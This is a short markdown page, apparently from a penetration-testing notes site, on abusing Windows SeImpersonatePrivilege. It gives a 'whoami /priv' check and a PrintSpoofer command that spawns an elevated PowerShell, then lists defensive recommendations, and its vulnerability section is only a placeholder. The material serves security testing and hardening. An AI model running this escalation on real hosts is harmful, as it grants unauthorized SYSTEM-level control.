---
layout: default
title: SeImpersonatePrivilege Abuse
parent: Windows
nav_order: 4
permalink: /windows/seimpersonateprivilege/
---

# SeImpersonatePrivilege Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---


## Vulnerability

TODO

## Exploit

```bash
# Check if SeImpersonatePrivilege is enabled for the current user
whoami /priv

# With PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell.exe
```

## Recommendations

- [ ] Disable SeImpersonatePrivilege on domain and local users.
- [ ] Enforce EDR on Windows hosts to detect and block PrintSpoofer like exploits.